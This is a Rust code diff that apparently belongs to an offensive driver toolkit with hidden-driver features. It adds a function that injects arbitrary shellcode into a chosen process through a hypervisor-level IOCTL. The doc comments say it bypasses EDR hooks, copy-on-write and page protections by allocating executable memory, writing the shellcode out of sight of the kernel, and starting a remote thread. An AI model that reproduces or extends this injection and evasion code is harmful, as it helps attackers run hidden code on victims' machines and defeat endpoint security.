@@ -37,6 +37,7 @@ const IOCTL_DIOPROCESS_HV_IS_DRIVER_HIDDEN: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 
 const IOCTL_DIOPROCESS_HV_REMOVE_HIDDEN_DRIVER: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x837, METHOD_BUFFERED, FILE_ANY_ACCESS);
 const IOCTL_DIOPROCESS_HV_CLEAR_HIDDEN_DRIVERS: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x838, METHOD_BUFFERED, FILE_ANY_ACCESS);
 const IOCTL_DIOPROCESS_HV_LIST_HIDDEN_DRIVERS: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x839, METHOD_BUFFERED, FILE_ANY_ACCESS);
+const IOCTL_DIOPROCESS_HV_INJECT_SHELLCODE: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x840, METHOD_BUFFERED, FILE_ANY_ACCESS);
 
 const MAX_HIDDEN_DRIVERS: usize = 16;
 
@@ -600,6 +601,93 @@ pub fn hv_list_hidden_drivers() -> Result<Vec<String>, CallbackError> {
             }
         }
         Ok(drivers)
+    } else {
+        Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
+    }
+}
+
+// ============== Ring -1 Injection Functions ==============
+
+/// Response for ring -1 shellcode injection
+#[derive(Debug, Clone)]
+pub struct HvInjectResult {
+    /// Address where shellcode was written
+    pub allocated_address: u64,
+    /// Bytes written via ring -1
+    pub bytes_written: u64,
+    /// Whether injection succeeded
+    pub success: bool,
+}
+
+/// Response struct matching C structure
+#[repr(C)]
+struct HvInjectShellcodeResponse {
+    allocated_address: u64,
+    bytes_written: u64,
+    success: u8, // BOOLEAN
+}
+
+/// Inject shellcode into a process via ring -1 (hypervisor level)
+///
+/// This bypasses all ring 0 protections including:
+/// - Copy-on-write
+/// - EDR hooks on memory operations
+/// - Page protection checks
+///
+/// The injection flow:
+/// 1. Allocates RWX memory in target process (ring 0)
+/// 2. Writes shellcode via hypervisor (ring -1) - invisible to ring 0
+/// 3. Creates remote thread to execute (ring 0)
+///
+/// Requirements:
+/// - Hypervisor must be running (call hv_start() first)
+/// - Target process must exist
+pub fn hv_inject_shellcode(pid: u32, shellcode: &[u8]) -> Result<HvInjectResult, CallbackError> {
+    if shellcode.is_empty() {
+        return Err(CallbackError::InvalidParameter);
+    }
+
+    let handle = open_driver()?;
+
+    // Build request with variable-length shellcode
+    let request_size = 8 + shellcode.len(); // 4 (pid) + 4 (size) + shellcode
+    let mut request_buffer = vec![0u8; request_size];
+
+    // Write PID (offset 0)
+    request_buffer[0..4].copy_from_slice(&pid.to_le_bytes());
+    // Write shellcode size (offset 4)
+    request_buffer[4..8].copy_from_slice(&(shellcode.len() as u32).to_le_bytes());
+    // Write shellcode (offset 8)
+    request_buffer[8..].copy_from_slice(shellcode);
+
+    let mut response = HvInjectShellcodeResponse {
+        allocated_address: 0,
+        bytes_written: 0,
+        success: 0,
+    };
+    let mut bytes_returned: u32 = 0;
+
+    let result = unsafe {
+        DeviceIoControl(
+            handle,
+            IOCTL_DIOPROCESS_HV_INJECT_SHELLCODE,
+            Some(request_buffer.as_ptr() as *const c_void),
+            request_size as u32,
+            Some(&mut response as *mut _ as *mut c_void),
+            size_of::<HvInjectShellcodeResponse>() as u32,
+            Some(&mut bytes_returned),
+            None,
+        )
+    };
+
+    unsafe { let _ = CloseHandle(handle); }
+
+    if result.is_ok() {
+        Ok(HvInjectResult {
+            allocated_address: response.allocated_address,
+            bytes_written: response.bytes_written,
+            success: response.success != 0,
+        })
     } else {
         Err(CallbackError::IoctlFailed(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32))
     }
